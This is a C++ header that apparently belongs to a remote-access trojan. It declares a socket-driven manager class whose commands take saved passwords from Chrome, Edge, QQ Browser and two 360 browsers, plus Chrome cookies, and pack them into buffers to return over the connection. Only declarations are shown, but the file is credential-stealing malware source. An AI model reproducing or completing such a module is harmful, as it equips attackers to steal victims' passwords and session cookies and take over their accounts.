#pragma once
#include "Manager.h"
#include <stdio.h>
#include <windows.h>
#include <cassert>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include<vector>
#include "GetBrowserInfo.h"
#include "Get360seInfo.h"
using namespace std;
enum
{

	COMMAND_LLQ_GetChromePassWord,
	COMMAND_LLQ_GetEdgePassWord,
	COMMAND_LLQ_GetSpeed360PassWord,
	COMMAND_LLQ_Get360sePassWord,
	COMMAND_LLQ_GetQQBroPassWord,
	COMMAND_LLQ_GetChromeCookies,

};


class CDecryptManger : public CManager
{
public:
	CDecryptManger(ISocketBase* pClient);
	virtual ~CDecryptManger();
	void senderror();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	char* GetCookiesChar(vector<BrowserData>* pPass, int* memLen);
	char* GetPassWChar(vector<BrowserCookies>* pCookies, int* memLen);	
	void DeleteMem(char** pChromeC);											
	bool GetChromeCookies(char** pChromeC, int* memLen);			// 获取chrome cookies
	bool GetChromePassWord(char** pChromePW, int* memLen);			// 获取chrome浏览器密码
	bool GetEdgePassWord(char** pChromePW, int* memLen);			// 获取windows10 edge浏览器密码
	bool GetQQBroPassWord(char** pQQPW, int* memLen);				// 获取QQ浏览器密码
	bool GetSpeed360PassWord(char** pChromePW, int* memLen);		// 获取speed360极速浏览器密码
	bool Get360sePassWord(char** pChromePW, int* memLen);			// 获取360安全浏览器密码
};
